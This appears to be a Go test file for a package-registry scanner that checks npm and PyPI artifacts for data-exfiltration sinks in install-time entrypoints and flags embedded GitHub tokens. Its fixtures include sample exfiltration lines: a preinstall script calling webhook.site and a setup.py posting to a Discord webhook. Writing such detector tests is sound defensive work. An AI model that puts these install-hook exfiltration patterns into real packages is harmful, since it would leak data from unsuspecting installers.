package intelligence

import (
	"context"
	"strings"
	"testing"
)

// TestIOCScanAtEntrypoint pins MaliciousIOCAtEntry, which gates the
// sc.exfil_sink_at_install quarantine: the coupled sink must be in a file that
// runs on install or import, not merely somewhere in the package.
func TestIOCScanAtEntrypoint(t *testing.T) {
	const sink = "const https=require('https');\nhttps.get('https://webhook.site/abc?h='+h);\n"
	cases := []struct {
		name  string
		eco   string
		files map[string]string
		want  bool
	}{
		{"npm hook script sends to the sink", "npm", map[string]string{
			"package/package.json": `{"name":"x","version":"1.0.0","scripts":{"preinstall":"node setup.js"}}`,
			"package/setup.js":     sink,
		}, true},
		{"npm sink outside the hook script", "npm", map[string]string{
			"package/package.json": `{"name":"x","version":"1.0.0","scripts":{"preinstall":"node setup.js"}}`,
			"package/setup.js":     "console.log('ok')\n",
			"package/lib/send.js":  sink,
		}, false},
		{"pypi setup.py posts to the sink", "pypi", map[string]string{
			"x-1.0/setup.py": "import requests\nrequests.post('https://discord.com/api/webhooks/1/x', data=d)\n",
		}, true},
		{"pypi plugin module (detect-secrets shape)", "pypi", map[string]string{
			"x-1.0/setup.py":              "from setuptools import setup\nsetup()\n",
			"x-1.0/x/plugins/slack.py":    "import requests\nrequests.post('https://hooks.slack.com/services/T0/B0/x', json=p)\n",
			"x-1.0/x/plugins/__init__.py": "",
		}, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := Request{
				Key:      Key{Ecosystem: tc.eco, Package: "x", Version: "1.0.0"},
				Artifact: &ArtifactHandle{Bytes: buildNPMTarball(t, tc.files)},
			}
			pr, err := newIOCScanProvider().Run(context.Background(), req, nil)
			if err != nil || pr.Scan == nil || !pr.Scan.MaliciousIOCCoupled {
				t.Fatalf("want a coupled exfil hit, got %+v err=%v", pr.Scan, err)
			}
			if pr.Scan.MaliciousIOCAtEntry != tc.want {
				t.Fatalf("MaliciousIOCAtEntry = %v, want %v (%s)", pr.Scan.MaliciousIOCAtEntry, tc.want, pr.Scan.MaliciousIOCDetail)
			}
		})
	}
}

// TestIOCScanIndicatorsWithoutAnIOC: the 2026-10-04 indicators are reported
// even when no exfil/stealer IOC fired, and reach risk.Input. The dependency
// credential arrives already redacted.
func TestIOCScanIndicatorsWithoutAnIOC(t *testing.T) {
	tok := "ghp_" + strings.Repeat("a1B2", 9)
	req := Request{
		Key: Key{Ecosystem: "npm", Package: "x", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: buildNPMTarball(t, map[string]string{
			"package/package.json": `{"name":"x","version":"1.0.0","dependencies":{"s":"git+https://` + tok + `@github.com/a/b.git"}}`,
		})},
	}
	pr, err := newIOCScanProvider().Run(context.Background(), req, nil)
	if err != nil || pr.Scan == nil {
		t.Fatalf("no scan section: %v", err)
	}
	s := pr.Scan
	if s.MaliciousIOC || s.DependencyCredential == "" || strings.Contains(s.DependencyCredential, tok) {
		t.Fatalf("got %+v", s)
	}
	in := ProjectToRiskInput(&Report{Scan: *s})
	if in.DependencyCredential == "" {
		t.Fatalf("not projected: %+v", in)
	}
}
